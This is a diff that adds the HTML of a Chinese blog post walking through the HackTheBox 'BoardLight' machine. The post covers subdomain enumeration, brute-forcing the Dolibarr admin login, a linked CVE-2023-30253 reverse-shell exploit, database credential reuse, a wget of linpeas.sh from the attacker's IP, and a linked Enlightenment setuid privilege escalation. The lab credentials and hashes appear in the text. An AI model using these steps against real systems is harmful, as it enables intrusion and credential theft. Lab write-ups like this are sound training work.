@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"sun-zzz.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":200,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Dolibarr 代码执行漏洞、Enlightenment组件权限提升漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BoardLight">
+<meta property="og:url" content="https://sun-zzz.github.io/article/BoardLight-HackTheBox.html">
+<meta property="og:site_name" content="rev1ve&#39;s blog">
+<meta property="og:description" content="Dolibarr 代码执行漏洞、Enlightenment组件权限提升漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sun-zzz.github.io/article/BoardLight-HackTheBox/image-20240530212903125.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/BoardLight-HackTheBox/image-20240530214310012.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/BoardLight-HackTheBox/image-20240530225345286.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/BoardLight-HackTheBox/image-20240530231214626.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/BoardLight-HackTheBox/image-20240601102008593.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/BoardLight-HackTheBox/image-20240601111112563.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/BoardLight-HackTheBox/image-20240601220215406.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/BoardLight-HackTheBox/image-20240601220653063.png">
+<meta property="article:published_time" content="2024-06-01T13:26:17.000Z">
+<meta property="article:modified_time" content="2024-09-01T14:38:45.062Z">
+<meta property="article:author" content="rev1ve">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sun-zzz.github.io/article/BoardLight-HackTheBox/image-20240530212903125.png">
+
+<link rel="canonical" href="https://sun-zzz.github.io/article/BoardLight-HackTheBox.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>BoardLight | rev1ve's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">rev1ve's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links" rel="section"><i class="fas fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sun-zzz.github.io/article/BoardLight-HackTheBox.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="rev1ve">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rev1ve's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          BoardLight
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-06-01 21:26:17" itemprop="dateCreated datePublished" datetime="2024-06-01T21:26:17+08:00">2024-06-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-09-01 22:38:45" itemprop="dateModified" datetime="2024-09-01T22:38:45+08:00">2024-09-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/article/BoardLight-HackTheBox.html" class="post-meta-item leancloud_visitors" data-flag-title="BoardLight" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/article/BoardLight-HackTheBox.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/article/BoardLight-HackTheBox.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Dolibarr 代码执行漏洞、Enlightenment组件权限提升漏洞</p>
+<span id="more"></span>
+
+<h1 id="BoardLight"><a href="#BoardLight" class="headerlink" title="BoardLight"></a>BoardLight</h1><p><strong>信息搜集</strong></p>
+<p>nmap扫描一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -v 10.10.11.11</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br></pre></td></tr></table></figure>
+
+<p>80端口有http服务并且为apache中间件，尝试访问一下</p>
+<p><img src="/article/BoardLight-HackTheBox/image-20240530212903125.png"></p>
+<p>拉到最下面得到域名信息<code>board.htb</code>，添加到hosts文件中成功访问</p>
+<p>爆破下子域名，得到<code>crm.board.htb</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -u http://board.htb/ -w /home/rev1ve/shentou/dict/zi-yu-ming/subdomains-10000.txt --append-domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/BoardLight-HackTheBox/image-20240530214310012.png"></p>
+<p>同理添加到hosts文件即可访问，注意到<code>Dolibarr 17.0.0</code></p>
+<p>不过大部分漏洞都要登录到后台界面才能利用，猜测存在admin用户</p>
+<p>burpsuite爆破密码得到admin，直接进行登录</p>
+<p><img src="/article/BoardLight-HackTheBox/image-20240530225345286.png"></p>
+<p>去阿里云漏洞库搜索，可利用漏洞如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CVE-2023-4197: Dolibarr ERP CRM (&lt;= 18.0.1) 不正确的输入清理验证 RCE</span><br><span class="line">CVE-2023-38888: Dolibarr ERP CRM 中的跨站脚本漏洞</span><br><span class="line">CVE-2023-4198: Dolibarr ERP CRM (&lt;= 17.0.3) 访问控制不当</span><br><span class="line">CVE-2023-30253: Dolibarr 代码执行漏洞</span><br><span class="line">CVE-2023-38886: Dolibarr 允许远程特权攻击者通过精心设计的命令/脚本执行任意代码</span><br><span class="line">CVE-2023-38887: Dolibarr ERP CRM 中的文件上传漏洞</span><br><span class="line">CVE-2023-5323: 跨站脚本 (XSS) - dolibarr/dolibarr 中的通用</span><br><span class="line">CVE-2024-23817: Dolibarr 应用程序主页 HTML 注入漏洞</span><br><span class="line">CVE-2024-29477: Dolibarr ERP CRM 安装过程中的代码注入漏洞</span><br><span class="line">CVE-2024-31503: Dolibarr 容易遭受跨站请求伪造</span><br></pre></td></tr></table></figure>
+
+<p>CVE-2023-4197、CVE-2023-4198利用失败</p>
+<p>在测试CVE-2023-30253的时候搜到网上现成的poc <a target="_blank" rel="noopener" href="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253">脚本链接</a></p>
+<p>直接反弹shell到本机</p>
+<p><img src="/article/BoardLight-HackTheBox/image-20240530231214626.png"></p>
+<p>经过一番查找，在<code>~/html/crm.board.htb/htdocs/conf</code>路径下找到敏感文件conf.php</p>
+<p><img src="/article/BoardLight-HackTheBox/image-20240601102008593.png"></p>
+<p>这里要先提升为完全交互式shell，不然后面连接数据库输入密码没反应</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>尝试本地mysql登录，密码为<code>serverfun2$2023!!</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u dolibarrowner -p -h localhost</span><br></pre></td></tr></table></figure>
+
+<p>连接成功后找到表<code>llx_user</code>，查询用户信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select login,pass_crypted from llx_user;</span><br></pre></td></tr></table></figure>
+
+<p>查询结果如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| login    | pass_crypted                                                 |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| dolibarr | $2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm |</span><br><span class="line">| admin    | $2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96 |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>不过用john都爆不出来，私钥文件也找不到</p>
+<p>之前有在<code>/home</code>下看到larissa用户，尝试用上面得到的数据库密码去ssh连接</p>
+<p>拿到user的flag</p>
+<p><img src="/article/BoardLight-HackTheBox/image-20240601111112563.png"></p>
+<p>经过一番查找，发现常见的提权方式比如sudo都不太行</p>
+<p>于是上传linpeas去自动化探测漏洞（在本机开启http服务）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.14.88/linpeas.sh</span><br></pre></td></tr></table></figure>
+
+<p>然后chmod给个执行权限直接执行</p>
+<p>发现存在0.23.1版本的enlightenment组件</p>
+<p><img src="/article/BoardLight-HackTheBox/image-20240601220215406.png"></p>
+<p>网上搜索找到利用enlightenment_sys二进制文件去权限提升的洞 <a target="_blank" rel="noopener" href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit">参考文章</a></p>
+<p><strong>Enlightenment组件权限提升漏洞</strong></p>
+<blockquote>
+<p>Enlightenment 0.25.4之前版本中的enlightenment_sys允许本地用户获得特权，因为它是setuid root，并且系统库函数错误处理以&#x2F;dev&#x2F;.开始的路径名</p>
+</blockquote>
+<p>用参考文章的exp打就行，得到root的flag</p>
+<p><img src="/article/BoardLight-HackTheBox/image-20240601220653063.png"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/HackTheBox/" rel="tag"># HackTheBox</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/article/CISCN2024%E5%88%9D%E8%B5%9B.html" rel="prev" title="CISCN2024 初赛">
+      <i class="fa fa-chevron-left"></i> CISCN2024 初赛
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/article/SolarLab-HackTheBox.html" rel="next" title="SolarLab">
+      SolarLab <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#BoardLight"><span class="nav-number">1.</span> <span class="nav-text">BoardLight</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rev1ve"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">rev1ve</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">73</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2024-03 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rev1ve</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'EbJd2uGnZROX6CGHpkKNkBAj-gzGzoHsz',
+      appKey     : 'KXq3KsjxZ28WDhwbOrLlm4Yw',
+      placeholder: "快来评论叭",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : 'https://ebjd2ugn.lc-cn-n1-shared.com'
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
